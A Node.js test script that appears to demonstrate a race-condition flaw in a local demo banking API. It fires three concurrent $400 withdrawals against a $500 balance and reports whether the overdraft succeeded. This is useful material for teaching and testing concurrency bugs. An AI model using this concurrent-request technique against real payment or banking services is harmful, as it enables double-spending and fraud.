/**
 * Simple Race Condition Test
 * 
 * This script demonstrates the race condition vulnerability by making multiple
 * concurrent withdrawal requests to show how the vulnerable endpoint allows
 * users to withdraw more money than they have in their account.
 */

const axios = require('axios');

async function resetBalance(userId, amount) {
    try {
        // First check current balance
        const balanceResponse = await axios.get(`http://localhost:3000/api/balance/${userId}`);
        const currentBalance = balanceResponse.data.balance;
        console.log(`User ${userId} current balance: $${currentBalance}`);
        
        // Calculate how much to deposit to reach target amount
        const depositAmount = amount - currentBalance;
        
        if (depositAmount !== 0) {
            if (depositAmount > 0) {
                await axios.post('http://localhost:3000/api/deposit', {
                    userId: userId,
                    amount: depositAmount
                });
                console.log(`Deposited $${depositAmount} to reset balance to $${amount}`);
            } else {
                // Need to withdraw to reach target
                await axios.post('http://localhost:3000/api/withdraw', {
                    userId: userId,
                    amount: Math.abs(depositAmount)
                });
                console.log(`Withdrew $${Math.abs(depositAmount)} to reset balance to $${amount}`);
            }
        }
        
        console.log(`User ${userId} balance reset to: $${amount}`);
    } catch (error) {
        console.error('Error resetting balance:', error.message);
    }
}

async function runRaceConditionTest() {
    console.log('=== Race Condition Vulnerability Test ===\n');
    
    const userId = 1;
    const initialBalance = 500; // Start with $500
    const withdrawalAmount = 400; // Try to withdraw $400
    const concurrentRequests = 3; // Make 3 concurrent requests
    
    // Reset balance to a known state
    await resetBalance(userId, initialBalance);
    
    console.log(`\nInitial balance for user ${userId}: $${initialBalance}`);
    console.log(`Attempting ${concurrentRequests} concurrent withdrawals of $${withdrawalAmount} each`);
    console.log(`Total possible withdrawal: $${withdrawalAmount * concurrentRequests} (should fail with only $${initialBalance})\n`);
    
    // Create concurrent requests
    const requests = [];
    for (let i = 0; i < concurrentRequests; i++) {
        requests.push(
            axios.post('http://localhost:3000/api/withdraw', {
                userId: userId,
                amount: withdrawalAmount
            })
            .then(response => {
                console.log(`Withdrawal ${i + 1}: SUCCESS - Withdrew $${response.data.amount}, Balance: $${response.data.oldBalance} → $${response.data.newBalance}`);
                return { success: true, data: response.data };
            })
            .catch(error => {
                console.log(`Withdrawal ${i + 1}: FAILED - ${error.response?.data?.error || error.message}`);
                return { success: false, error: error.response?.data?.error || error.message };
            })
        );
    }
    
    // Execute all requests concurrently
    const results = await Promise.all(requests);
    
    // Count successful withdrawals
    const successfulWithdrawals = results.filter(r => r.success).length;
    const totalWithdrawn = successfulWithdrawals * withdrawalAmount;
    
    // Check final balance
    const finalBalanceResponse = await axios.get(`http://localhost:3000/api/balance/${userId}`);
    const finalBalance = finalBalanceResponse.data.balance;
    
    console.log(`\n--- Results ---`);
    console.log(`Successful withdrawals: ${successfulWithdrawals}/${concurrentRequests}`);
    console.log(`Total withdrawn: $${totalWithdrawn}`);
    console.log(`Initial balance: $${initialBalance}`);
    console.log(`Expected final balance (with race condition): $${initialBalance - totalWithdrawn}`);
    console.log(`Actual final balance: $${finalBalance}`);
    
    if (successfulWithdrawals > 1) {
        console.log(`\n⚠️  RACE CONDITION EXPLOITED! ⚠️`);
        console.log(`Multiple withdrawals succeeded simultaneously!`);
        console.log(`User withdrew $${totalWithdrawn} from an account with only $${initialBalance}`);
        
        if (finalBalance < (initialBalance - totalWithdrawn)) {
            console.log(`This resulted in an overdraft! Balance: $${finalBalance}`);
        }
    } else {
        console.log(`\nNo race condition detected in this run (timing was unlucky).`);
        console.log(`Try running the test multiple times to see the race condition.`);
    }
}

// Run the test
runRaceConditionTest().catch(console.error);